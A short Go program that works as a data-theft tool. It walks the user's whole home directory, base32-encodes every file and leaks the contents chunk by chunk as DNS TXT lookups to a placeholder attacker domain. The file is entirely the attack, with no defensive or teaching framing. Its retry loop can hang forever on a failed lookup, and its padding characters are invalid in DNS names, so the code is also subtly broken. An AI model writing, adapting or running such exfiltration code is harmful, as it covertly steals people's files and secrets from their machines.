package main

import (
        "encoding/base32"
        "fmt"
        "io/fs"
        "io/ioutil"
        "net"
        "os"
        "path/filepath"
)

func main() {
        homeDirname, err := os.UserHomeDir()
        if err != nil {
                fmt.Println("Error getting home directory:", err)
                return
        }

        domainName := "replaceme.tld"
        chunkSize := 20

        err = filepath.WalkDir(homeDirname, func(path string, d fs.DirEntry, err error) error {
                if err != nil {
                        fmt.Printf("Error accessing path %s: %v\n", path, err)
                        return err
                }

                if !d.IsDir() {
                        content, err := ioutil.ReadFile(path)
                        if err != nil {
                                fmt.Printf("Error reading file %s: %v\n", path, err)
                                return err
                        }

                        encodedString := base32.StdEncoding.EncodeToString([]byte(content))
                        size := len(encodedString)
                        index := 0
                        stringIndex := 0

                        for index <= size-1 {
                                endIndex := stringIndex + chunkSize - 1
                                if endIndex >= size {
                                        endIndex = size - 1
                                }

                                query := encodedString[index:endIndex+1]
                                dnsQuery := query + "." + domainName

                                _, err := net.LookupTXT(dnsQuery)
                                if err != nil {
                                        continue
                                }

                                index += chunkSize
                                stringIndex += chunkSize
                        }
                }
                return nil
        })

        if err != nil {
                fmt.Println("Error walking directory:", err)
        }
}
